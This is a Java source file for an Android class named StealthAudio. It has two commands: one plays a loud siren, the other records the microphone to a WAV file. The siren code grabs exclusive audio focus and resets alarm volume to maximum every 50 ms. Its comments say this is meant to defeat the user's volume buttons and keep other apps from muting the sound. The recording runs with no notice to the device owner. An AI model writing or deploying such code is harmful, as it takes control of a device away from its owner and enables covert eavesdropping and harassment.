import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.MediaRecorder;
import android.content.Context;
import java.io.FileOutputStream;
import java.io.RandomAccessFile;

public class StealthAudio {
    private static Context getContext() {
        try {
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
            return (Context) activityThreadClass.getMethod("getApplication").invoke(activityThread);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    public static void main(String[] args) {
        try {
            if (args.length == 0) return;
            if (args[0].equals("play")) {
                float volume = 1.0f;
                if (args.length > 1) {
                    try {
                        volume = Float.parseFloat(args[1]);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                playSiren(volume);
            } else if (args[0].equals("record")) {
                if (args.length > 1) {
                    int recDuration = 30;
                    if (args.length > 2) {
                        try {
                            recDuration = Integer.parseInt(args[2]);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    recordAudio(args[1], recDuration);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void playSiren(float volume) {
        int sampleRate = 44100;
        int duration = 30; // seconds
        int numSamples = duration * sampleRate;
        double sample[] = new double[numSamples];

        double highFreq = 1400.0;
        double lowFreq = 800.0;
        double segmentSeconds = 0.8;
        int segmentSamples = (int) (segmentSeconds * sampleRate);

        byte generatedSnd[] = new byte[2 * numSamples];
        for (int i = 0; i < numSamples; ++i) {
            double time = (double) i / sampleRate;
            int segmentIndex = (i / segmentSamples) % 2;
            double currentFreq = segmentIndex == 0 ? highFreq : lowFreq;
            sample[i] = Math.sin(2 * Math.PI * currentFreq * time);
        }

        int idx = 0;
        for (final double dVal : sample) {
            final short val = (short) ((dVal * 32767));
            generatedSnd[idx++] = (byte) (val & 0x00ff);
            generatedSnd[idx++] = (byte) ((val & 0xff00) >>> 8);
        }

        // Force system volume to max continuously in a background thread
        Thread volumeThread = new Thread(new Runnable() {
            @Override
            public void run() {
                Context context = getContext();
                if (context == null) return;

                AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                if (audioManager == null) return;

                // Request audio focus so other apps (like music players or calls) cannot duck or mute our sound
                audioManager.requestAudioFocus(null, AudioManager.STREAM_ALARM, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE);

                long end = System.currentTimeMillis() + (duration * 1000);
                int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM);

                while (System.currentTimeMillis() < end) {
                    try {
                        // Aggressively set the max volume to instantly counter any physical volume button presses
                        audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVolume, 0);
                        // 50ms interval ensures the user has zero effective time to keep the sound quiet
                        Thread.sleep(50);
                    } catch (Exception e) {
                        // Ignore thread interrupts
                    }
                }
                audioManager.abandonAudioFocus(null);
            }
        });
        volumeThread.start();

        AudioTrack audioTrack = new AudioTrack(AudioManager.STREAM_ALARM,
                sampleRate, AudioFormat.CHANNEL_OUT_MONO,
                AudioFormat.ENCODING_PCM_16BIT, generatedSnd.length,
                AudioTrack.MODE_STATIC);

        audioTrack.setVolume(volume);
        audioTrack.write(generatedSnd, 0, generatedSnd.length);
        audioTrack.play();
        try {
            Thread.sleep(duration * 1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
        audioTrack.release();
    }

    private static void recordAudio(String outPath, int durationSecs) {
        int sampleRate = 44100;
        int bufferSize = AudioRecord.getMinBufferSize(sampleRate,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
            bufferSize = sampleRate * 2;
        }

        AudioRecord recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize);

        recorder.startRecording();

        try {
            FileOutputStream os = new FileOutputStream(outPath);
            byte[] header = new byte[44];
            os.write(header);

            byte[] data = new byte[bufferSize];
            long endTime = System.currentTimeMillis() + (durationSecs * 1000);
            int totalAudioLen = 0;

            while (System.currentTimeMillis() < endTime) {
                int read = recorder.read(data, 0, bufferSize);
                if (read > 0) {
                    os.write(data, 0, read);
                    totalAudioLen += read;
                }
            }
            recorder.stop();
            recorder.release();
            os.close();

            // Fix WAV header
            RandomAccessFile raf = new RandomAccessFile(outPath, "rw");
            int totalDataLen = totalAudioLen + 36;
            int byteRate = sampleRate * 2;

            header[0] = 'R';
            header[1] = 'I';
            header[2] = 'F';
            header[3] = 'F';
            header[4] = (byte) (totalDataLen & 0xff);
            header[5] = (byte) ((totalDataLen >> 8) & 0xff);
            header[6] = (byte) ((totalDataLen >> 16) & 0xff);
            header[7] = (byte) ((totalDataLen >> 24) & 0xff);
            header[8] = 'W';
            header[9] = 'A';
            header[10] = 'V';
            header[11] = 'E';
            header[12] = 'f';
            header[13] = 'm';
            header[14] = 't';
            header[15] = ' ';
            header[16] = 16;
            header[17] = 0;
            header[18] = 0;
            header[19] = 0;
            header[20] = 1;
            header[21] = 0;
            header[22] = 1;
            header[23] = 0;
            header[24] = (byte) (sampleRate & 0xff);
            header[25] = (byte) ((sampleRate >> 8) & 0xff);
            header[26] = (byte) ((sampleRate >> 16) & 0xff);
            header[27] = (byte) ((sampleRate >> 24) & 0xff);
            header[28] = (byte) (byteRate & 0xff);
            header[29] = (byte) ((byteRate >> 8) & 0xff);
            header[30] = (byte) ((byteRate >> 16) & 0xff);
            header[31] = (byte) ((byteRate >> 24) & 0xff);
            header[32] = 2;
            header[33] = 0;
            header[34] = 16;
            header[35] = 0;
            header[36] = 'd';
            header[37] = 'a';
            header[38] = 't';
            header[39] = 'a';
            header[40] = (byte) (totalAudioLen & 0xff);
            header[41] = (byte) ((totalAudioLen >> 8) & 0xff);
            header[42] = (byte) ((totalAudioLen >> 16) & 0xff);
            header[43] = (byte) ((totalAudioLen >> 24) & 0xff);

            raf.seek(0);
            raf.write(header);
            raf.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
